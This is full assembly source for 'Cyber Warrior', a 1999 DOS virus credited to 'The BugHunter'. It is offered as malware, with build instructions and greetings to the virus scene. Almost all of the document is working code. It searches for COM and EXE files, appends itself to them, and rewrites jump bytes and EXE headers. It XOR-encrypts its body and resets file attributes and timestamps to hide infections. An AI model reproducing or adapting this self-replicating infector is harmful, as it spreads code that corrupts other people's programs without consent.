;****************************************************************************
;*                              Virus Information                           *
;*##########################################################################*
;*                                                                          *
;*        Origin: Germany                      Source: The BugHunter        *
;*        Crate Date: 03.07.1999               Version: 1.2.2               *
;*        Last Modification Date: 07.11.1999                                *
;*                                                                          *
;*              Turbo Assembler Version 4.0    : tasm virus                 *
;*              Turbo Link Version 3.01        : tlink virus /t             *
;*                                                                          *
;*##########################################################################*
;*                           Modification History                           *
;*==========================================================================*
;*     v1.0    1. Create the Virus Body                                     *
;*             2. Add Payload                                               *
;*             3. Add Encryption for Payload                                *
;* 03/07/1999  4. Add COM-Infection                                         *
;*             5. Add ReSet File Attributes                                 *
;*             6. Add ReSet File Date/Time                                  *
;*             7. Virus Size: 818 Bytes                                     *
;*==========================================================================*
;*     v1.1    1. Now whole Virus is encrypted with filesize in the DTA     *
;* 06/07/1999  2. Virus Size: 895 Bytes                                     *
;*==========================================================================*
;*     v1.2    1. Add EXE-Infection                                         *
;*             2. Add new better encryption                                 *
;* 19/10/1999  3. Virus Size: 1331 Bytes                                    *
;****************************************************************************
;*    v1.2.2   1. Virus doesn't infect windows EXE any longer               *
;* 07/11/1999  2. Virus Size: 1342 Bytes                                    *
;****************************************************************************
;
; TSR..................... No
; Encrypted............... Yes
; Appending Virus......... Yes
; Bat infector............ No
; Doc infector............ No
; Com infector............ Yes
; Exe infector............ Yes
; Ovl infector............ No
; Sys infector............ No
; Pe infector............. No
; Ne infector............. No
; Boot infector........... No
; Polimorphic............. No
; ReSet Attrib............ Yes (Of Course)
; ReSet Time/Date......... Yes (Of Course)
; Avoid Heuristic......... No
; Disable Watchdogs....... No
; Targets Checksums....... No
; Payload................. No
; Message................. Yes
; Error trapping.......... No
; Directory Stealth....... No
; Full Stealth............ No
; Memory Stealth.......... No
; Size Stealth............ No
;
;Bugs:
;-don't know any bugs   ;)
;

display ''
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display 'л                         Cyber Warrior Ver. 1.2.2                         л'
display 'л                          (C) 1999 The BugHunter                      :-) л'
display 'лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл'
display ''
display 'Greets to all Kefrens members, #german_vir and all friends in or out'
display '  the virus scene and of course to all friends from real life ;)'
display ''
display 'After a long time without coding viruses i ''ll now start to go on!'
display ''
display '                           !!!I AM OUTTA THERE!!!'

title  Cyber Warrior
subttl (C) 1999 The BugHunter
subttl Latest revision: 07.11.1999

jumps

.radix 16
code segment
assume cs:code, ds:code, es:code

ID=0cdabh
org 100h

jump_to_virus:
        db      0e9h
        dw      virus-jump_to_virus-3
        dw      ID                                      ;ID    ;)

virus:
        xor     si, si
db      081h, 0c6h
value   dw      encrypted_area
;        add     si, virusposition

        push    si
        push    si
        add     si, xor_loop-encrypted_area
        mov     cx, 0312eh
        mov     2 ptr cs:[si], cx
        mov     cl, 004h
        mov     1 ptr cs:[si+2], cl

        mov     cx, 0e246h
        mov     2 ptr cs:[si+3], cx

        mov     cx, 0c3fah
        mov     2 ptr cs:[si+5], cx

        mov     al, 1 ptr cs:[si+7]

        pop     si
        mov     cx, 0fbe8h

;!!!!!!!!!!!!!!!!!!!!!Debug!!!!!!!!!!!!!!!!!!!!!
        mov     2 ptr cs:[si-6], cx
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        pop     si
        mov     cx, (crypt-encrypted_area)
        xor     al, 0ffh

call_xor_loop:
        db ':)',04h

;!!!!!!!!!!!!!!!!!!!!!Debug!!!!!!!!!!!!!!!!!!!!!
;        db 0e8h, 0fbh, 004h
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

;!!!!!!!!!!!!!!!!!!!!!Debug!!!!!!!!!!!!!!!!!!!!!
;        call    xor_loop
;!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

        jmp     encrypted_area

encrypted_area:
        call    delta_offset

delta_offset:

        pop     bp
        sub     bp, OFFSET delta_offset

        push    es

        mov     ah, 1 ptr cs:[bp+whatami]
        mov     1 ptr cs:[bp+ dummy2], ah
        cmp     1 ptr cs:[bp+ whatami], 0

        jne     restore_exe

restore_com:
        mov     di, 100h
        lea     si, [bp+ orgbytes]
        mov     cx, 05h
        rep     movsb
        jmp     find_first_com

restore_exe:
        push    cs
        pop     ds
        push    cs
        pop     es

        lea     si, cs:[bp+ orgCSIP2]
        lea     di, cs:[bp+ orgCSIP]

        mov     cx, 8
        rep     movsb

find_first_com:
        mov     ah, 1ah
        lea     dx, cs:[bp+ dta]
        int     21h

        mov     ah, 4eh
        lea     dx, cs:[bp+ commask]
        mov     cl, 07h

find_file:
        int     21h

        jc      no_files_found

delete_attributes:
        mov     ax, 4301h
        xor     cl, cl
        lea     dx, cs:[bp+ dta+ 1eh]
        int     21h

set_pointer_to_file:
        mov     ax, 3d02h
        lea     dx, cs:[bp+ dta+ 1eh]
        int     21h

        xchg    bx, ax

get_first_five_bytes:
        mov     ah, 3fh
        mov     cx, 05h
        lea     dx, cs:[bp+ orgbytes]
        int     21h

infect_com:
is_it_an_exe_file:
        cmp     2 ptr cs:[bp+ orgbytes], 'MZ'
        je      infect_exe
        cmp     2 ptr cs:[bp+ orgbytes], 'ZM'
        je      infect_exe
        cmp     2 ptr cs:[bp+ orgbytes+ 03h], ID
        je      close_file

        mov     1 ptr cs:[bp+ whatami], 0

calculate_jump:
        mov     ax, 2 ptr cs:[bp+ dta+ 1ah]
        sub     ax, 03h
        mov     2 ptr cs:[bp+ virbytes+ 01h],ax

write_new_bytes_to_com:
        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 40h
        lea     dx, cs:[bp+ virbytes]
        mov     cx, 05h
        int     21h

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h

        add     ax, encrypted_area- virus+ 100h
        mov     cs:[bp+ value], ax

        jmp     write_virus_to_eof

infect_exe:
        mov     1 ptr cs:[bp+ whatami], 1

        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 3fh
        mov     cx, 1ah
        lea     dx, cs:[bp+ buffer]
        int     21h

        cmp     1 ptr cs:[bp+ buffer +18h], '@'
        je      close_file

        cmp     2 ptr cs:[bp+ buffer+ 12h], ID             ;ID  ;)
        je      close_file

        mov     ax, 2 ptr cs:[bp+buffer+0eh]     ; SS
        mov     2 ptr cs:[bp+ orgSSSP2+02h], ax
        mov     ax, 2 ptr cs:[bp+buffer+10h]     ; SP
        mov     2 ptr cs:[bp+ orgSSSP2], ax
        mov     ax, 2 ptr cs:[bp+buffer+16h]     ; CS
        mov     2 ptr cs:[bp+ orgCSIP2+02h], ax
        mov     ax, 2 ptr cs:[bp+buffer+14h]     ; IP
        mov     2 ptr cs:[bp+ orgCSIP2], ax

        mov     ax, 4202h
        xor     cx, cx
        mov     dx, cx
        int     21h

        push    ax dx
        push    ax

        mov     ax, 2 ptr cs:[bp+ buffer+ 08h]
        mov     cl, 04h
        shl     ax, cl
        mov     cx, ax
        pop     ax
        sub     ax, cx
        sbb     dx, 00h
        mov     cl, 0ch
        shl     dx, cl
        mov     cl, 04h
        push    ax
        shr     ax, cl
        add     dx, ax
        shl     ax, cl
        pop     cx
        sub     cx, ax

        mov     2 ptr cs:[bp+ buffer+ 14h], cx
        mov     2 ptr cs:[bp+ buffer+ 16h], dx
        mov     2 ptr cs:[bp+ buffer+ 0eh], dx
        mov     2 ptr cs:[bp+ buffer+ 10h], ((the_end-virus)*2+200h)       ;SP
        mov     2 ptr cs:[bp+ buffer+ 12h], ID                             ;ID

        add     cx, OFFSET encrypted_area- OFFSET virus
        mov     2 ptr cs:[bp+ value], cx

        pop     dx ax

        add     ax, temp_data-virus
        adc     dx, 00h
        mov     cx, 0200h
        div     cx
        cmp     dx, 0
        je      enough
        inc     ax

enough:
        mov     2 ptr cs:[bp+ buffer+ 04h], ax
        mov     2 ptr cs:[bp+ buffer+ 02h], dx

        mov     ax, 4200h
        xor     cx, cx
        cwd
        int     21h

        mov     ah, 40h
        lea     dx, cs:[bp+ buffer]
        mov     cx, 1ah
        int     21h

write_virus_to_eof:

        mov     ax, 4202h
        xor     cx, cx
        cwd
        int     21h

write_virus:
        lea     si, cs:[bp+part1]
        mov     2 ptr cs:[si],0addeh
        mov     1 ptr cs:[si+2],000h

        lea     si, cs:[bp+part2]
        mov     2 ptr cs:[si],'-:'
        mov     2 ptr cs:[si+2],'P{'

        lea     si, cs:[bp+call_xor_loop]
        mov     2 ptr cs:[si],020cdh

        lea     si, cs:[bp+ dta+ 1ah]
        lea     di, cs:[bp+ key]
        movsb

        lea     si, cs:[bp+ virus]
        lea     di, cs:[bp+ the_end]
        mov     cx, the_end- virus
        rep     movsb

        lea     si, cs:[bp+part1]
        mov     2 ptr cs:[si], 0302eh
        mov     1 ptr cs:[si+2],004h

        lea     si, cs:[bp+part2]
        mov     2 ptr cs:[si], 0e246h
        mov     2 ptr cs:[si+2], 0c3fah

        lea     si, (encrypted_area-virus)+the_end+bp
        mov     cx, (crypt-encrypted_area)
        mov     al, 1 ptr cs:[bp+ dta+ 1ah]
        xor     al, 0ffh

        call    crypt

        mov     ah, 40h
        mov     cx, temp_data-virus
        lea     dx, cs:[bp+ the_end]
        int     21h

restore_file_date&time:
        mov     ax, 5701h
        mov     cx, 2 ptr cs:[bp+ dta+ 16h]
        mov     dx, 2 ptr cs:[bp+ dta+ 18h]
        int     21h

restore_attributes:
        mov     ax, 4301h
        mov     cl, 1 ptr cs:[bp+ dta+ 15h]
        lea     dx, cs:[bp+ dta+ 1eh]
        int     21h

close_file:
        mov     ah, 3eh
        int     21h

find_next_file:
        mov     ah, 4fh
        jmp     find_file

no_files_found:
        cmp     1 ptr cs:[bp+ dummy], 1
        jne     next_loop
        jmp     pay_load

next_loop:
        mov     1 ptr cs:[bp+ dummy], 1
        mov     ah, 4eh
        lea     dx, cs:[bp+ exemask]
        mov     cl, 07h
        jmp     find_file

pay_load:
        mov     dx, 80h
        mov     ah, 1ah
        int     21h

        mov     ah, 09h
        lea     dx, cs:[bp+ msg]
        int     21h

        mov     ah, 1 ptr cs:[bp+dummy2]
        cmp     ah, 0
        jne     back_to_exe

back_to_com:
        mov     si, 100h
        jmp     si

back_to_exe:

        pop     ds

        push    ds
        pop     es

        mov     ax, es
        add     ax, 10h

        add     2 ptr cs:[bp+ orgCSIP+2], ax

        cli
        add     ax, 2 ptr cs:[bp+ orgSSSP+2]
        mov     ss, ax
        mov     sp, 2 ptr cs:[bp+orgSSSP]
        sti

        db      0eah
orgCSIP dd      ?
orgSSSP dd      ?
        int     20h

virusdata:
orgbytes db     0cdh, 020h, 0, 0, 0
virbytes db     0e9h, 000h, 0, 0abh, 0cdh
commask  db     '*.com',0
exemask  db     '*.exe',0
orgCSIP2 dd     ?
orgSSSP2 dd     ?
whatami  db     0

pay_load_data:
msg     db      0dh, 0ah, '**************************************************************', 0dh, 0ah
        db      '*                       Virus Information                    *', 0dh, 0ah
        db      '*############################################################*', 0dh, 0ah
        db      '* Origin: Germany                      Source: The BugHunter *', 0dh, 0ah
        db      '* Crate Date: 03.07.1999               Version: 1.2.2        *', 0dh, 0ah
        db      '* Last Modification Date: 07.11.1999   Name: Cyber Warrior   *', 0dh, 0ah
        db      '*                     We are outta here!                     *', 0dh, 0ah
        db      '**************************************************************', 0dh, 0ah, '$'
whoami  db      '{CybErWArriOr}[ThEBuGHuNtEr]'
dead    dw      0addeh

crypt:
xor_loop:
part1   db      0deh, 0adh, 004h
;        db      2eh, 31h, 04h
;=       xor     cs:[si], ax
;        db      2eh, 30h, 04h
;=       xor     cs:[si], ah

part2  db      046h
;        inc     si
        db      0e8h, 0fah
;        loop    xor_loop
        db      0c3h
;        ret

key     db      0ffh

temp_data:
        db      0dh, 0ah, 'Just Temp Data:', 0dh, 0ah
dummy   db      0
dummy2  db      0
dummy3  dw      0
dta     db      42h dup (?)
buffer  db      1ah dup (?)
text    db      0dh, 0ah, 'Just for fun ;)', 0dh, 0ah
        db      'My first virus written without any tutorials', 0dh, 0ah
        db      'and without copy and paste   ;)', 0dh, 0ah
        db      '*******************************', 0dh, 0ah
        db      '* Origin: Germany             *', 0dh, 0ah
        db      '* Source: The BugHunter       *', 0dh, 0ah
        db      '* Virus Name: Cyber Warrior   *', 0dh, 0ah
        db      '* Version: 1.2                *', 0dh, 0ah
        db      '* Latest revision: 19.10.1999 *', 0dh, 0ah
        db      '*******************************', 0dh, 0ah
        db      'Keep The Infections Alive!!!!!'
eof     db      '---===EOF===---'

the_end:

code ends
end jump_to_virus
end
